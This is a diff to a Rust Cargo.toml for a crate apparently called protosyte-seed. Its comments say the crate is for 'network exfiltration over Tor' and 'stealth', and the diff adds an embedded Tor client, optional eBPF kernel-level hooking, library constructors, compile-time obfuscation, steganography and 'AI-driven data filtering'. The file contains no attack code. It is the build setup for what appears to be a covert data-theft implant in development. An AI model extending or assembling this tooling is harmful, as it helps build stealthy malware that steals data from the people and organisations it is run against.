@@ -17,7 +17,8 @@ prost = { version = "0.14", features = ["derive"] }
 prost-types = "0.14"
 
 # Network exfiltration over Tor
-reqwest = { version = "0.12", features = ["rustls-tls", "socks", "multipart"] } # SOCKS5 proxy for Tor
+reqwest = { version = "0.12", features = ["rustls-tls", "socks", "multipart"] } # SOCKS5 proxy for Tor (fallback)
+arti-client = { version = "0.14", features = ["tokio", "native-tls"] } # Embedded Tor client
 tokio = { version = "1.40", features = ["full"] } # Async runtime
 
 # In-memory data processing & steganography
@@ -29,7 +30,15 @@ zeroize = "1.8" # Securely zero memory
 # System integration & stealth
 libc = "0.2"
 nix = "0.28" # For syscalls, process manipulation
-# For eBPF (Optional, advanced): aya = { git = "https://github.com/aya-rs/aya" }
+aya = { version = "0.13", features = ["async_tokio"], optional = true } # eBPF kernel-level hooking
+
+# Post-quantum cryptography (optional)
+pqcrypto-kyber = { version = "0.5", optional = true }  # Kyber-768 (ML-KEM)
+pqcrypto-dilithium = { version = "0.5", optional = true }  # Dilithium-3 (ML-DSA)
+
+# AI-driven filtering (optional)
+ort = { version = "2.0.0-rc.10", features = ["cpu"], optional = true }  # ONNX Runtime
+ndarray = { version = "0.16", optional = true }  # Array operations for AI
 
 # Additional utilities
 sha2 = "0.10" # For HMAC-SHA256
@@ -42,9 +51,19 @@ ctor = "0.6.2" # For library constructors
 [build-dependencies]
 prost-build = "0.14"
 
+[target.'cfg(all(target_arch = "x86_64", target_os = "linux"))'.build-dependencies]
+# eBPF compilation requires clang/LLVM - handled by build.rs
+
 [features]
 default = []
 obfuscate = []  # Enable compile-time obfuscation
+post-quantum = ["pqcrypto-kyber", "pqcrypto-dilithium"]  # Enable post-quantum crypto
+ai-filtering = ["ort", "ndarray"]  # Enable AI-driven data filtering
+ebpf = ["aya"]  # Enable eBPF kernel-level hooking
+
+[dependencies.protosyte-seed-macros]
+path = "../protosyte-seed-macros"
+version = "0.1.0"
 
 [dev-dependencies]
 tokio-test = "0.4"  # For async testing utilities
